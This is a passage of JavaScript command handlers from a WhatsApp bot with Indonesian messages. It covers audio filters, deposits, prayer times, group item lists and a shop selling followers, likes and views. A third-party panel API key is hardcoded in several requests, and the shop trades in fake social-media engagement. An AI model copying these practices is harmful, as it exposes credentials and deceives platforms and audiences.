if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Link\n\nContoh :\n${prefix+command} https://ronzxapis.my.id`) 
var ronzz = await fetchJson(`${api}/api/shortlink/bitly?url=${q}&apikey=${apikey}`) 
let teksnya = "*Shorts Link Bitly*\n"
teksnya += `*Sebelum :* ${q}\n`
teksnya += `*Sesudah :* ${ronzz.result}`
reply(teksnya)
}
addCmd(command, 1, db_dashboard)
break

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!isQuotedAudio) return reply(`Reply audio/vn dengan caption *${prefix+command}*`)
if ((isQuotedAudio).seconds > 60) return reply('Maximum 60 seconds!')
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (isQuotedAudio) {
reply(mess.wait)
let media = await ronzz.downloadAndSaveMediaMessage(msg, "audio", `./options/audio/${sender.split('@')[0]}.mp3`)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, async (error) => {
fs.unlinkSync(media)
if (error) return reply(mess.errorApi)
let buff = fs.readFileSync(ran)
ronzz.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(ran)
})
}
} catch {
reply(mess.errorApi)
}
}
addCmd(command, 1, db_dashboard)
break

case 'tts': case 'texttospeech':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Teks\n\nContoh :\n${prefix+command} Ronzz Official`)
let hasilNya = await fetchJson(`https://danzzapi.xyz/api/tools/tts?text=${q}&lang=id-ID&apikey=danzz`)
ronzz.sendMessage(from, { audio: { url: hasilNya.result }, mimetype: 'audio/mpeg', ptt: true }, { quoted: msg })
}
break

case 'saldo':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${cekUser("name", sender)}_
 _• *Resi:* ${cekUser("resi", sender)}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_saldo hanya bisa untuk topup_
_tidak bisa ditarik atau transfer_!`)
}
break

case 'deposit': case 'depo':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
var rows = [
{
title: "QRIS",
rowId: "payment_qris",
description: "Status : True"
},
{
title: "DANA",
rowId: "payment_dana",
description: "Status : True"
},
{
title: "OVO",
rowId: "payment_ovo",
description: "Status : True"
},
{
title: "GOPAY",
rowId: "!payment_gopay",
description: "Status : False"
}
]
var dep_but = {
text: `Hai *${cekUser("name", sender)}* ${ucapanWaktu} 👋\ningin melakukan deposit saldo? silahkan pilih payment yang tersedia☺`,
buttonText: "Pilih disini",
sections: [ { title: "PAYMENT DEPOSIT", rows } ]
}
ronzz.sendMessage(from, dep_but)
}
break

case 'payment_gopay':
reply('Payment Gopay belum tersedia\nSilahkan pilih payment lain ya☺')
break

case 'bukti':
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) return reply(`Maaf *${cekUser("name", sender)}* sepertinya kamu belum pernah melakukan deposit`)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
await ronzz.downloadAndSaveMediaMessage(msg, "image", `./options/deposit/${sender.split('@')[0]}.jpg`)

let oke_bang = fs.readFileSync(`./options/deposit/${sender.split('@')[0]}.jpg`)
let data_depo = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))

let caption_bukti =`「 *DEPOSIT USER* 」
⭔ID Resi: ${data_depo.ID}
⭔Nomer: @${data_depo.number.split('@')[0]}
⭔Payment: ${data_depo.payment}
⭔Tanggal: ${data_depo.date.split(' ')[0]}
⭔Jumlah Deposit: Rp${toRupiah(data_depo.data.amount_deposit)}
⭔Pajak: Rp2.500
⭔Total Bayar: Rp${toRupiah(data_depo.data.amount_deposit+2500)}

Ada yang deposit nih kak, coba dicek saldonya, jika sudah masuk konfirmasi dengan klik button *Accept*`

let bukti_button = [
{ buttonId: `#acc_deposit ${sender.split('@')[0]}`, buttonText: {displayText: 'Accept'}, type: 1},
{ buttonId: `#reject_deposit ${sender.split('@')[0]}`, buttonText: {displayText: 'Reject'}, type: 1}
]
let bukti_bayar = {
image: oke_bang,
caption: caption_bukti,
title: 'bukti pembayaran',
footer: 'Press The Button Below',
buttons: bukti_button,
headerType: 5 
}
ronzz.sendMessage(`${ownerNomer}`, bukti_bayar)
reply(`Mohon tunggu ya kak, sampai di acc oleh owner ☺`)
fs.unlinkSync(`./options/deposit/${sender.split('@')[0]}.jpg`)
break

case 'acc_deposit':{
if (!isOwner) return reply('Fitur ini khusus owner')
let orang = q
let data_deposit = JSON.parse(fs.readFileSync(depositPath + orang + '.json'))
addSaldo(data_deposit.number, Number(data_deposit.data.amount_deposit), db_saldo)
var text_sukses = `「 *DEPOSIT SUKSES* 」
⭔ID : ${data_deposit.ID}
⭔Name ${cekUser("name", sender)}
⭔Nomer: ${data_deposit.number.split('@')[0]}
⭔Payment: ${data_deposit.payment}
⭔Tanggal: ${data_deposit.date.split(' ')[0]}
⭔Jumlah Deposit: Rp${toRupiah(data_deposit.data.amount_deposit)}`
reply(`${text_sukses}\n`)
ronzz.sendMessage(data_deposit.number, { text: `${text_sukses}\n\n_Deposit kamu telah dikonfirmasi oleh admin, silahkan cek saldo dengan cara ketik #saldo_`})
fs.unlinkSync(depositPath + data_deposit.number.split('@')[0] + ".json")
}
break

case 'reject_deposit':{
if (!isOwner) return reply('Fitur ini khusus owner')
let orang = q
let data_deposit = JSON.parse(fs.readFileSync(depositPath + orang + '.json'))
reply(`Sukses Reject ID Deposit : ${data_deposit.ID}`)
ronzz.sendMessage(data_deposit.number, { text: `Maaf Deposit Dengan ID : *${data_deposit.ID}* Ditolak, Jika ada kendala hubungin Owner Bot.\nwa.me/${ownerNomer.split('@')[0]}`})
fs.unlinkSync(depositPath + data_deposit.number.split('@')[0] + ".json")
}
break

case 'order':
case 'caraorder':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
let capp = `*Hallo _${cekUser("name", sender)}_*\n*Berikut Ini Cara Order Sosmed Shop*\n\n*Order Followers :*\n_Example_\n_${prefix}followers jumlah|username [ tanpa (@) ]_\n\n_Contoh_\n_${prefix}followers 500|RonzzOfc_\n\n*Order View :*\nExample_\n_${prefix}view jumlah|link_\n\n_Contoh_\n_${prefix}view 10000|https://vm.tiktok.com/xxxxxxx_\n\n*Order Like :*\n_Example_\n_${prefix}like jumlah|link_\n\n_Contoh_\n_${prefix}like 10000|https://www.instagram.com/p/xxxxxxx_\n\nSekian penjelasan cara order\nSemoga anda paham dengan penjelasan ini☺\nbeli = paham`
ronzz.sendMessage(from, {text: capp}, {quoted:msg})
}
break

case 'view': case 'like': case 'followers':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (args.length < 1) return reply(`Link atau Usernamenya mana?\n\nJika masih bingung cara order silahkan ketik *#order*`)
let juma = q.split('|')[0] ? q.split('|')[0]: q
let targtt = q.split('|')[1] ? q.split('|')[1]: ''
if (targtt.length < 1) return reply(`Jumlah dan Target harus di isi!`)
let fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=${command}`)
let arr_wors = []
let textplus = `${juma}|${targtt}`
for (let x of fetaa.data) {
arr_wors.push({
title: `${x.nama}`,
rowId: `${prefix}confirmorderkunci ${textplus}|${x.id_layanan}`,
description: `${x.desc}`
})
}
var listMsg = {
text: `Pilih layanan sesuai dengan yang ingin anda beli!\njika anda membeli followers maka pilih followers\ndiharapkan anda sudah faham.`,
buttonText: 'Click Here!',
footer: `${botName} © 2022`,
mentions: [sender],
sections: [{
title: 'SOSMED - SHOP', rows: arr_wors
}]
}
ronzz.sendMessage(from, listMsg, {quoted: fkontak})
}
break

case 'prichlist':
case 'pricelist':{
let feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=semua`)
let list = '*List Harga Layanan*\n\n'
for (let L of feta.data) {
list += `name : ${L.nama}\ndesc : ${L.desc}\nmin : ${L.min}\nmax : ${L.max}\nharga : ${L.price}\nid : ${L.id_layanan}\n\n`
}
ronzz.sendMessage(from, {text: list}, {quoted:msg})
//console.log(feta)
}
break

case 'cekstatus':
if (isGroup) return reply(mess.private)
if (args.length < 1) return reply('idnya mana bang')
let seta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=status&order_id=${q}`)
//console.log(seta)
if (seta.status == false) {
var captionnye = `ID order tidak di temukan`
} else {
var captionnye = `*Status Orderan Anda*\n\nTarget : ${seta.data.target}\nStatus : ${seta.data.status}\nFollowers Default : ${seta.data.start_count}\nOn Process : ${seta.data.kurang}\nTotal Order : ${seta.data.total_order}\nTanggal Pesan : ${seta.data.tanggal_pesan}\nJumlah Pembayaran : ${seta.data.amount}\nId Pesanan : ${seta.data.order_id}\n\nTerimakasih sudah membeli followers dari kami, ditunggu next ordernya!`
}
reply(captionnye)
break

case 'confirmorderkunci': { //KUNCI = BIAR GA DIAKSES HEHE
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isGroup) return reply(mess.private)
if (args.length < 1) return reply(`*Cara order followers*\n\n*Example :*\n_${prefix + command} jumlah|username tanpa (@)_\n\n*Contoh :*\n_${prefix + command} 500|RonzzOfc_\n\n*Min pesan :* _300_ \n*Max pesan :* _500k_\n\nThank You`)
let jumlah = q.split('|')[0] ? q.split('|')[0]: q
let targ = q.split('|')[1] ? q.split('|')[1]: q
let idny = q.split('|')[2] ? q.split('|')[2]: ''
let feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=order&quantity=${jumlah}&target=${targ}&id_layanan=${idny}`)
if (feta.status == false) {
reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${feta.data.msg} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
} else {
let idpes = feta.data.order_id
let cap = `Hay *${cekUser("name", sender)} 👋,* Terimakasih Telah Order di Sosmed Shop!\nScan QR diatas untuk membayar! MENGGUNAKAN QRIS.\n\n*Id Pesanan Anda :* ${feta.data.order_id}\n*Target :* ${targ}\n*Jumlah Pesanan :* ${jumlah}\n*Total Harga Pesanan :* Rp${toRupiah(feta.data.amount)}\n*Status Orderan :* ${feta.data.status}\n\n_Info lebih lanjut klik button dibawah._`
let buto = [{
buttonId: `${prefix}cekstatus ${feta.data.order_id}`,
buttonText: {
displayText: 'Check Status'
},
type: 1
}]
ronzz.sendMessage(from, {
caption: cap, image: {
url: feta.data.qris
}, buttons: buto, footer: `${botName} © 2022`
})
}
console.log(feta)
}
break

case 'addjudul':
if (args.length === 0) return reply(`Buat list dengan judul\n\nContoh : ${prefix}addjudul | <judul tugas>`);
if (judullist.length > 0) return reply(`Mohon untuk reset tugas terlebih dahulu dengan command ${prefix}resettugas`);
const isijudullist = q.split(`|`)[1];
const judulin = judullist.push(isijudullist);
if (judulin) return reply(`Tugas sudah ditambahkan, untuk menambahkan tugas menggunakan command ${prefix}addtugas | <nama tugas>`);
break;

case 'addtugas':
if (args.length === 0) return reply(`Tambah daftar Tugas dengan isi\n\nContoh : ${prefix}addtugas | <nama tugas>`);
if (judullist.length === 0) return reply(`Mohon untuk membuat judul Tugas terlebih dahulu dengan command ${prefix}addjudultugas`);
const isilist = q.split(`|`)[1];
const isiin = daftarlist.push(isilist);
if (isiin) {
const isidaftar = ngelistisi();
reply(isidaftar);
}
break;

case 'deltugas':
if (args.length === 0) return reply(`Hapus item pada List dengan nomor item\n\nContoh : ${prefix}deltugas 1`);
if (daftarlist.length === 0) return reply(`Tambah daftar tugas dengan isi\n\nContoh : ${prefix}addtugas | <nama tugas>`);
if (judullist.length === 0) return reply(`Mohon untuk membuat judul tugas terlebih dahulu dengan command ${prefix}addjudultugas`);
var i = args[1];
i--;
const hapusinlist = daftarlist.splice(i, 1);
if (hapusinlist){
reply(`Item dengan nomor ${args} telah dihapus !`);
const isidaftar = ngelistisi();
reply(isidaftar);
}
break;

case 'listtugas':
if (daftarlist.length === 0) return reply(`Tambah daftar tugas dengan isi\n\nContoh : ${prefix}addtugas | <ini tugas>`);
if (judullist.length === 0) return reply(`Mohon untuk membuat judul tugas terlebih dahulu dengan command ${prefix}addjudultugas`);
const isidaftar = ngelistisi();
reply(isidaftar);
break;

case 'resettugas':
while (daftarlist.length) { 
daftarlist.pop(); 
}
while (judullist.length) { 
judullist.pop(); 
}
if (daftarlist.length === 0 && judullist.length === 0) return reply(`tugas sudah di reset !`);
break;

case 'ppcp':
case 'ppcouple':
case 'couplepp':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
let data = fs.readFileSync('./options/ppcp.js');
let  jsonData = JSON.parse(data);
let randIndex = Math.floor(Math.random() * jsonData.length);
let json = jsonData[randIndex];
let randCowo= await getBuffer(json.cowo)
ronzz.sendMessage(from, { image: randCowo, caption: '*Ini yang cowo🙏*' }, { quoted: msg })
let randCewe = await getBuffer(json.cewe)
ronzz.sendMessage(from, { image: randCewe, caption: '*Ini yang cewe🙏*' }, { quoted: msg })
}
addCmd(command, 1, db_dashboard)
break

case 'animelink':
case 'linkanime':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
let teks =`*${cekUser("name", sender)}* Ternyata Wibu🗿😆
╭───❏  「 *Anime* 」
├ https://kusonime.com
├ https://anoboy.media
├ https://AniFans.club
├ https://oploverzz.net
├ https://Otakudesu.moe
├ https://neonime.site
├ https://gomunime.online
├ https://samehadaku.vip
├ https://drivenime.com
├ https://Anitoki.xyz
├ https://Anime-indo.cc
├ https://otakudere.net
├ https://huntersekaisub.blogspot.com
├ https://o.anibatch.me
├ https://animeku.me
├ https://anikyojin.net
├ https://samehadaku.vip
├ https://riie.jp
├ https://asta.zonawibu.cc
├ https://anitoki.web.id
├ https://anime-indo.co
├ https://meownime.moe
├ https://meownime.ltd
├ https://miownime.com
├ https://nimegami.com
├ https://anisubindo.video
├ https://wibudesu.com
├ https://shirainime.com
├ https://animeku.com
├ https://naruchiha.id
├ https://gantzid.com
├ https://animekompi.web.id
├ https://www.pandanime.online
├ https://Koenime.com
├ https://moenime.web.id
├ https://nontonanimeid.com
├ https://pendekarsubs.us
├ https://melodysubs.net
├ https://pucuktranslation.pw
├ https://kazefuri.net
├ https://haruzorasubs.net
├ https://myanimelist.net
╰──❏`
reply2(teks)
}
addCmd(command, 1, db_dashboard)
break

case 'quotesanime':
case 'quoteanime':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
reply(mess.wait)
quotesAnime().then(async anu =>{
let result = anu[Math.floor(Math.random(), anu.length)]
let gam = await getBuffer(result.gambar)
let but = [
{ buttonId: `${prefix}quotesanime`, buttonText: { displayText: 'Next Quotes' }, type: 1 }
]
ronzz.sendMessage(from, { location: { jpegThumbnail: await reSize(gam, 300, 150) }, caption: `_${result.quotes}_\n\nBy *${result.karakter}*, ${result.anime}\n\n*_- ${result.up_at}_*`, footer: `${botName} © 2022`, buttons: but }, { quoted: msg })
})
}
addCmd(command, 1, db_dashboard)
break

case 'jadwalsholat': case 'jadwalshalat':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Daerah\n\nContoh :\n${prefix+command} Cirebon`)
let data = await sholat(q)
let txt = '*Jadwal Shalat*\n\n'
txt += `*• Daerah :* ${q}\n\n`
txt += `*• Date :* ${moment(new Date()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss DD/MM/YYYY')}\n`
txt += `*• Imsak :* ${data.result.imsak}\n`
txt += `*• Subuh :* ${data.result.shubuh}\n`
txt += `*• Dzuhur :* ${data.result.dzuhur}\n`
txt += `*• Ashar :* ${data.result.ashar}\n`
txt += `*• Magrib :* ${data.result.maghrib}\n`
txt += `*• Isya :* ${data.result.isya}`
reply(txt)
}
addCmd(command, 1, db_dashboard)
break

case 'servermc':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
const res = await yogipw.servermc()
let teks = "*| SERVER MC INDONESIA |*\n\nhttps://minecraftpocket-servers.com/country/indonesia/\n\n"
let no = 1
for (let i of res){
teks += `▸ Server ke ${no++}\nIp : ${i.ip}\nPort : ${i.port}\nVersi : ${i.versi}\nPlayer : ${i.player}\n\n`
}
reply(teks)
}
addCmd(command, 1, db_dashboard)
break

case 'ayatkursi': case 'ayatqursi':
if (cekUser("id", sender) == null) return sendMessRegis(from)
reply(`*Ayat Kursi*

اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”

Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya), tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)`)
addCmd(command, 1, db_dashboard)
break

case 'asmaulhusna':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
let data = await fetchJson(`https://raw.githubusercontent.com/Danzzxcodes/scraper/main/islamic/asmaul_husna.json`)
reply(data)
}
addCmd(command, 1, db_dashboard)
break

case 'tafsirsurah': case 'tafsirsurat':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Surah\n\nContoh :\n${prefix+command} Al-Fatihah`)
let data = await tafsirsurah(q)
let teks = `*TAFSIR SURAH*
⭔Surah : ${data.result.surah}
⭔Tafsir : ${data.result.tafsir}
⭔Type : ${data.result.type}
⭔Source : ${data.result.source}`
reply(teks)
}
addCmd(command, 1, db_dashboard)
break

case 'randomimage':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
let data = await fetchJson(`https://raw.githubusercontent.com/Danzzxcodes/scraper/main/islamic/random_img.json`)
let result = data[Math.floor(Math.random() * data.length)];
ronzz.sendMessage(from, { image: { url: result }}, { quoted: msg })
}
addCmd(command, 1, db_dashboard)
break

case 'setdone': case 'setd':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *teks_done*\n\n_Contoh_\n\n${prefix+command} pesanan @pesan, tag orang @nama\n\nList Opts : tanggal/jamwib`)
if (isSetDone(from, set_done)) return reply(`Set done already active`)
addSetDone(q, from, set_done)
reply(`Successfully set done!`)
addCmd(command, 1, db_dashboard)
break

case 'delsetdone': case 'delsetd':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isSetDone(from, set_done)) return reply(`Belum ada set done di sini..`)
removeSetDone(from, set_done)
reply(`Sukses delete set done`)
addCmd(command, 1, db_dashboard)
break

case 'changedone': case 'changed':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *teks_done*\n\n_Contoh_\n\n${prefix+command} pesanan @pesan, tag orang @nama\n\nList Opts : tanggal/jamwib`)
if (isSetDone(from, set_done)) {
changeSetDone(q, from, set_done)
reply(`Sukses change set done teks!`)
} else {
addSetDone(q, from, set_done)
reply(`Sukses change set done teks!`)
}
addCmd(command, 1, db_dashboard)
break

case 'setproses': case 'setp':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!q) return reply(`Gunakan dengan cara *${prefix+command} teks*\n\n_Contoh_\n\n${prefix+command} pesanan @pesan, tag orang @nama`)
if (isSetProses(from, set_proses)) return reply(`Set proses already active`)
addSetProses(q, from, set_proses)
reply(`Sukses set proses!`)
addCmd(command, 1, db_dashboard)
break

case 'delsetproses': case 'delsetp':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isSetProses(from, set_proses)) return reply(`Belum ada set proses di sini..`)
removeSetProses(from, set_proses)
reply(`Sukses delete set proses`)
addCmd(command, 1, db_dashboard)
break

case 'changeproses': case 'changep':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *teks_p*\n\n_Contoh_\n\n${prefix+command} pesanan @pesan, tag orang @nama`)
if (isSetProses(from, set_proses)) {
changeSetProses(q, from, set_proses)
reply(`Sukses change set proses teks!`)
} else {
addSetProses(q, from, set_proses)
reply(`Sukses change set proses teks!`)
}
addCmd(command, 1, db_dashboard)
break

case 'kali':
case 'kali_kan':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Angka Angka\n\nContoh :\n${prefix+command} 2 4`)
var nilai_one = Number(q.split(" ")[0])
var nilai_two = Number(q.split(" ")[1])
reply(`${nilai_one * nilai_two}`)
}
addCmd(command, 1, db_dashboard)
break

case 'bagi':
case 'bagi_kan':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Angka Angka\n\nContoh :\n${prefix+command} 2 2`)
var nilai_one = Number(q.split(" ")[0])
var nilai_two = Number(q.split(" ")[1])
reply(`${nilai_one / nilai_two}`)
}
addCmd(command, 1, db_dashboard)
break

case 'kurang':
case 'kurang_kan':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Angka Angka\n\nContoh :\n${prefix+command} 6 2`)
var nilai_one = Number(q.split(" ")[0])
var nilai_two = Number(q.split(" ")[1])
reply(`${nilai_one - nilai_two}`)
}
addCmd(command, 1, db_dashboard)
break

case 'tambah':
case 'tambah_kan':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Angka Angka\n\nContoh :\n${prefix+command} 8 2`)
var nilai_one = Number(q.split(" ")[0])
var nilai_two = Number(q.split(" ")[1])
reply(`${nilai_one + nilai_two}`)
}
addCmd(command, 1, db_dashboard)
break

case 'd': case 'done':
if (!isGroup) return ('Hanya Dapat Digunakan Di Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!isQuotedMsg) return ('Reply Pesanannya!')
let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM : ${jamwib}\n✨ STATUS: Berhasil\`\`\`\n\nTerimakasih @${quotedMsg.sender.split("@")[0]} Next Order ya🙏`
const getTextD = getTextSetDone(from, set_done);
if (getTextD !== undefined) {
mentions(getTextD.replace('pesan', quotedMsg.chats).replace('nama', quotedMsg.sender.split("@")[0]).replace('jam', jamwib).replace('tanggal', tanggal), [quotedMsg.sender], true);
} else {
mentions(sukses, [quotedMsg.sender], true)
}
addCmd(command, 1, db_dashboard)

break

case 'p': case 'proses':
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!isQuotedMsg) return ('Reply Pesanannya!')
let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM : ${jamwib}\n✨ STATUS: Pending\`\`\`\n\n📝 Catatan :\n${quotedMsg.chats}\n\nPesanan @${quotedMsg.sender.split("@")[0]} sedang di proses!`
const getTextP = getTextSetProses(from, set_proses);
if (getTextP !== undefined) {
mentions(getTextP.replace('pesan', quotedMsg.chats).replace('nama', quotedMsg.sender.split("@")[0]).replace('jam', jamwib).replace('tanggal', tanggal), [quotedMsg.sender], true)
} else {
mentions(proses, [quotedMsg.sender], true)
}
addCmd(command, 1, db_dashboard)

break

case 'cekitem':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!isGroup) return reply(mess.group)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
var listMsg = {
text: `Hi @${sender.split("@")[0]}`,
buttonText: 'Click Here!',
footer: `*_itemList ${groupName}_*`,
mentions: [sender],
sections: [{
title: groupName, rows: arr_rows
}]
}
ronzz.sendMessage(from, listMsg, {quoted: msg})
}
addCmd(command, 1, db_dashboard)
break

case 'additem':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${prefix+command} *key@response*\n\n_Contoh_\n\n${prefix+command} tes@apa`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (isImage || isQuotedImage) {
let media = await downloadAndSaveMediaMessage('image', `./temp/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
reply(`Berhasil menambah List menu *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil menambah List menu : *${args1}*`)
}
addCmd(command, 1, db_dashboard)
break

case 'delitem':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *key*\n\n_Contoh_\n\n${prefix+command} hello`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
addCmd(command, 1, db_dashboard)
break
case 'id':{
reply(from)
}
addCmd(command, 1, db_dashboard)
break

case 'setitem':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${prefix+command} *key@response*\n\n_Contoh_\n\n${prefix+command} tes@apa`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (isImage || isQuotedImage) {
let media = await downloadAndSaveMediaMessage('image', `./temp/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
reply(`Berhasil menambah List menu *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil menambah List menu : *${args1}*`)
}
addCmd(command, 1, db_dashboard)
break

case 'add':
